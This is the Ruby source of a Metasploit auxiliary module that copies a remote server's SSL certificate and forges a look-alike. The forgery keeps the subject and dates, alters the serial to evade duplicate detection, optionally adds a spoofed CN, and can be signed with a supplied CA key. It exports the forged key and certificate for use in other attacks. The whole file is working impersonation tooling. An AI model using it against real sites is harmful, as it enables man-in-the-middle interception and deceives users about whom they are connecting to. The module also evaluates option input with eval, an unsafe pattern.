##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'HTTP SSL Certificate Impersonation',
			'Version'     => '$Revision$',
			'Author'      => ' Chris John Riley',
			'License'     => MSF_LICENSE,
			'Description' => %q{
					This module request a copy of the remote SSL certificate and creates a local
					(self.signed) version using the information from the remote version.
					The module then Outputs (PEM|DER) format private key / certificate and a
					combined version for use in Apache or other Metasploit modules requiring SSLCert
					Inputs for private key / CA cert have been provided for those with diginator certs
					hanging about!
			}
		)

		register_options(
			[
				Opt::RPORT(443),
				OptString.new('OUT_FORMAT', [true, "Output format PEM / DER", 'PEM']),
				OptString.new('EXPIRATION', [false, "Date the new cert should expire (e.g. 06 May 2012, Yesterday or Now)", '']),
				OptString.new('PRIVKEY', [false, "Sign the cert with your own CA private key ;)", '']),
				OptString.new('PRIVKEY_PASSWORD', [false, "Password for private key specified in PRIV_KEY (if applicable)", '']),
				OptString.new('CA_CERT', [false, "CA Public certificate", '']),
				OptString.new('ADD_CN', [false, "Add CN to match spoofed site name (e.g. *.example.com)", '']),
			], self.class)
	end

	def run

		print_status("Connecting to #{rhost}:#{rport}")

		if (datastore['PRIVKEY'] != '' and datastore['CA_CERT'] != '')
			print_status("Signing generated certificate with provided KEY and CA Certificate")
			if datastore['PRIVKEY_PASSWORD'] != ''
				ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY']), datastore['PRIVKEY_PASSWORD'])
			else
				ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY']))
			end
			ca = OpenSSL::X509::Certificate.new(File.read(datastore['CA_CERT']))
		elsif (datastore['PRIVKEY'] != '' or datastore['CA_CERT'] != '')
			print_error("CA Certificate AND Private Key must be provided!")
			return
		end

		begin
			connect(true, {"SSL" => true}) # Force SSL even for RPORT != 443
			cert  = OpenSSL::X509::Certificate.new(sock.peer_cert) # Get certificate from remote rhost
			disconnect
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
		rescue ::Timeout::Error, ::Errno::EPIPE => e
			print_error(e.message)
		end

		if(not cert)
			print_error("#{rhost} No certificate subject or CN found")
			return
		end

		print_status("Copying certificate #{cert.subject.to_s} from #{rhost}:#{rport}")
		vprint_status("Original Certifcate Details\n\n#{cert.to_text}")

		begin
			keylength = /Key: \((\d+)/i.match(cert.signature_algorithm)[1] # Grab keylength from target cert
		rescue
			keylength = 1024
		end

		begin
			hashtype = /Algorithm: (\w+)With/i.match(cert.to_text)[1] # Grab hashtype from target cert
		rescue
			hashtype = 'sha1'
		end

		new_cert = OpenSSL::X509::Certificate.new
		ef = OpenSSL::X509::ExtensionFactory.new#(nil,new_cert)

		# Duplicate information from the remote certificate
		entries = ['version','serial', 'subject', 'not_before','not_after']
		entries.each do | ent |
			eval("new_cert.#{ent} = cert.#{ent}")
		end

		if datastore['ADD_CN'] != ''
			new_cert.subject = OpenSSL::X509::Name.new(new_cert.subject.to_a << ["CN", "#{datastore['ADD_CN']}"])
			print_status("Adding #{datastore['ADD_CN']} to the end of the certificate subject")
			vprint_status("Certificate Subject: #{new_cert.subject}")
		end

		if datastore['EXPIRATION'] != ''
			print_status("Altering certificate expiry information to #{datastore['EXPIRATION']}")

			case datastore['EXPIRATION'].downcase
			when 'yesterday'
				new_cert.not_after = 24.hours.ago
				new_cert.not_before = 1.year.ago - 24.hours # set start date (1 year cert)
				vprint_status("Certificate expiry date set to #{new_cert.not_after}")
			when 'now'
				new_cert.not_after = Time.now
				new_cert.not_before = 1.year.ago # set start date (1 year cert)
				vprint_status("Certificate expiry date set to #{new_cert.not_after}")
			else
				new_cert.not_after = Time.parse(datastore['EXPIRATION'])
				new_cert.not_before = Time.parse(datastore['EXPIRATION']) - 1.year # set start date (1 year cert)
				vprint_status("Certificate expiry date set to #{new_cert.not_after}")
			end
		end

		# Alter serial to avoid duplicate issuer/serial detection
		if (cert.serial.to_s.length > 1)
			new_cert.serial = (cert.serial.to_s[0..-2] + rand(0xFF).to_s).to_i
		else
			new_cert.serial = rand(0xFFFF)
		end

		if datastore['PRIVKEY'] != ''
			new_cert.public_key = ca_key.public_key
			ef.subject_certificate = ca
			ef.issuer_certificate = ca
			new_cert.issuer = ca.subject
			print_status("Using private key #{datastore['PRIVKEY']}")
		else
			new_key = OpenSSL::PKey::RSA.new(keylength.to_i)
			new_cert.public_key = new_key.public_key
			ef.subject_certificate = new_cert
			ef.issuer_certificate = new_cert
			if datastore['ADD_CN'] != ''
				new_cert.issuer = new_cert.subject
			else
				new_cert.issuer = cert.subject
			end
		end

		new_cert.extensions = [
			ef.create_extension("basicConstraints","CA:FALSE", true),
			ef.create_extension("subjectKeyIdentifier","hash"),
		]

		if datastore['PRIVKEY'] != ''
			new_cert.sign(ca_key, eval("OpenSSL::Digest::#{hashtype.upcase}.new"))
			new_key = ca_key # Set for file output
		else
			new_cert.sign(new_key, eval("OpenSSL::Digest::#{hashtype.upcase}.new"))
		end

		vprint_status("Duplicate Certificate Details\n\n#{new_cert.to_text}")
		print_status("Beginning export of certificate files")

		priv_key = new_key.send(eval("\"to_#{datastore['OUT_FORMAT'].downcase}\""))
		cert_crt = new_cert.send(eval("\"to_#{datastore['OUT_FORMAT'].downcase}\""))
		combined = new_key.send("to_pem") + new_cert.send("to_pem")

		addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB

		store_loot("#{datastore['RHOST'].downcase}_key", datastore['OUT_FORMAT'].downcase, addr, priv_key, "imp_ssl.key", "Impersonate_SSL")
		store_loot("#{datastore['RHOST'].downcase}_cert", datastore['OUT_FORMAT'].downcase, addr, cert_crt, "imp_ssl.crt", "Impersonate_SSL")
		store_loot("#{datastore['RHOST'].downcase}_pem", "pem", addr, combined, "imp_ssl.pem", "Impersonate_SSL")

		print_good("Created required files from remote server #{rhost}:#{rport}")
		print_good("Files stored in ~/.msf4/loot (.key|.crt|.pem)")

	end
end